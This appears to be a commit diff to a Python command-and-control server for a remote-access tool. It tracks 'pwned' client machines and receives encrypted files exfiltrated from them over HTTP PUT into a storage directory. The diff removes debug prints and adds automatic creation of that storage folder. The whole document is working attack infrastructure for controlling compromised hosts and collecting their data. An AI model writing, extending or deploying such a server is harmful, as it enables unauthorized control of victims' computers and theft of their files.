@@ -7,6 +7,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 from colorama import Fore
 from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
+from os import path, mkdir
 from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST, CWD_RESPONSE, FILE_REQUEST, RESPONSE, RESPONSE_KEY, INPUT_TIMEOUT, KEEP_ALIVE_CMD,
@@ -198,20 +199,16 @@ class C2Handler(BaseHTTPRequestHandler):
 
             # Split out the encrypted filename from http put requests
             filename = self.path.split(FILE_SEND + "/")[1]
-            # Test print
-            print("filename Before decryption: ", filename)
+
 
             # Encode the file because decryption requires it, then decrypt and then decode
             filename = cipher.decrypt(filename.encode()).decode()
-            # test print
-            print("filename After decryption: ", filename)\
 
             # Add filename to our storage path
             incomingFile = STORAGE + "/" + filename
-            # Test print
-            print("incomingFile: ", incomingFile)
 
             # We need Content Length to properly read in the file
+            # noinspection PyTypeChecker
             fileLength = int(self.headers["Content-Length"])
 
             # Read the Stream coming from our connected client, then decrypt it and write the file to disk on C2 server
@@ -280,6 +277,11 @@ pwnedId = 0
 # Track all pwned clients; key = pwned_id and value is unique from each client.
 # value follow this pattern => (account@hostname@epoch time)
 pwnedDict = {}
+
+# If the STORAGE Directory is not present on our c2 server, Create it
+if not path.isdir(STORAGE):
+    mkdir(STORAGE)
+
 
 # This a current working directory from the client belonging to active session
 cwd = "~"
